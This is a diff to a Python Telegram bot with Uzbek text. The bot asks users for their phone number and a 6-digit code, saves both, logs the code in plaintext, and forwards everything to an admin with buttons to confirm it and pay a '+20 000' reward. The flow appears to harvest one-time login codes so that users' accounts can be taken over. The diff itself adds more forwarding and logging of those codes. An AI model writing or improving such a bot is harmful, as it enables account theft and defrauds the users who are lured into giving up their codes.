@@ -24,6 +24,10 @@ if not BOT_TOKEN:
     logger.error("❌ BOT_TOKEN topilmadi!")
     exit(1)
 
+if ADMIN_ID == 0:
+    logger.error("❌ ADMIN_ID topilmadi!")
+    exit(1)
+
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
@@ -313,10 +317,11 @@ async def process_phone(message: types.Message, phone: str):
             f"⏳ Kod kutilmoqda...",
             parse_mode="HTML"
         )
+        logger.info(f"✅ Admin xabari yuborildi (telefon): {telegram_id}")
     except Exception as e:
         logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")
 
-# ================= 5. KODNI QABUL QILISH =================
+# ================= 5. KODNI QABUL QILISH (ADMINGA BORISHI KERAK) =================
 @dp.message(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
 async def receive_code(message: types.Message):
     code = message.text.strip()
@@ -331,6 +336,7 @@ async def receive_code(message: types.Message):
         await message.answer("❌ 6 xonali kod kiriting:")
         return
     
+    # Kodni database ga saqlash
     conn = None
     try:
         conn = await get_db()
@@ -339,40 +345,59 @@ async def receive_code(message: types.Message):
             "VALUES ($1, $2, $3, 'pending')",
             phone, code, telegram_id
         )
+        logger.info(f"✅ Kod saqlandi: {telegram_id} - {code}")
     except Exception as e:
         logger.error(f"❌ Kodni saqlashda xatolik: {e}")
     finally:
         if conn:
             await conn.close()
     
+    # Foydalanuvchiga javob
     await message.answer(
         "⏳ Kodingiz qabul qilindi!\nAdmin tekshirib, tasdiqlaydi...",
         reply_markup=user_menu
     )
     
+    # ADMINGA XABAR YUBORISH (MUHIM QISM)
     try:
         user_info = await bot.get_chat(telegram_id)
         username = user_info.username if user_info.username else "mavjud_emas"
         
+        # 2 TUGMA (tasdiqlash va rad etish)
         keyboard = InlineKeyboardMarkup(row_width=2)
         keyboard.add(
             InlineKeyboardButton(text="✅ To'g'ri kod (+20 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
             InlineKeyboardButton(text="❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
         )
         
-        await bot.send_message(
-            ADMIN_ID,
+        # Admin xabari
+        admin_text = (
             f"🔑 <b>KOD TEKSHIRISH KERAK</b>\n\n"
             f"👤 <b>Foydalanuvchi:</b> <a href='tg://user?id={telegram_id}'>🔗 Profilga o'tish</a>\n"
             f"🆔 ID: <code>{telegram_id}</code>\n"
             f"📞 Telefon: <code>{phone}</code>\n"
             f"🔑 Kod: <code>{code}</code>\n"
-            f"👤 Username: @{username}",
+            f"👤 Username: @{username}"
+        )
+        
+        await bot.send_message(
+            ADMIN_ID,
+            admin_text,
             reply_markup=keyboard,
             parse_mode="HTML"
         )
+        logger.info(f"✅ Admin xabari yuborildi (kod): {telegram_id} - {code}")
+        
     except Exception as e:
         logger.error(f"❌ Admin'ga kod yuborishda xatolik: {e}")
+        # Xatolik haqida admin ga xabar
+        try:
+            await bot.send_message(
+                ADMIN_ID,
+                f"❌ Xatolik: {e}\nTelegram ID: {telegram_id}\nKod: {code}"
+            )
+        except:
+            pass
     
     user_states[telegram_id] = "done"
 
@@ -939,8 +964,19 @@ async def main():
     # Keep-alive
     asyncio.create_task(keep_alive())
     
+    # Webhook ni o'chirish (conflict ni oldini olish)
+    try:
+        await bot.delete_webhook(drop_pending_updates=True)
+        logger.info("✅ Webhook o'chirildi")
+    except Exception as e:
+        logger.error(f"❌ Webhook ni o'chirishda xatolik: {e}")
+    
     # Botni polling orqali ishga tushirish
-    await dp.start_polling(bot, skip_updates=True)
+    await dp.start_polling(
+        bot, 
+        skip_updates=True,
+        allowed_updates=["message", "callback_query"]
+    )
 
 if __name__ == "__main__":
     try:
